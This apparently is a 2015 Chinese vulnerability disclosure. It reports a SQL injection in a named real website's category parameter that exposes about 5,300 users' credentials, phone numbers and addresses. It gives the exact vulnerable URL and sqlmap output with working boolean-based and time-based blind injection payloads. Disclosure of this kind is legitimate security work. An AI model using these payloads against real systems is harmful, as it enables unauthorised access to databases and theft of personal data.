漏洞详情 披露状态：   									2015-07-01：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-08-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 泄露用户名，登陆密码，手机号，家庭住址，等等等，能泄露的都泄露了。5300个用户 详细说明：  1、
http://m.haolyy.com/web/showmember/appcatview?categoryId1=10

sqlmap identified the following injection points with a total of 57 HTTP(s) requests:---Parameter: categoryId1 (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: categoryId1=10 AND 6535=6535    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: categoryId1=10 AND (SELECT * FROM (SELECT(SLEEP(5)))KDEs)---web application technology: JSPback-end DBMS: MySQL 5.0.12
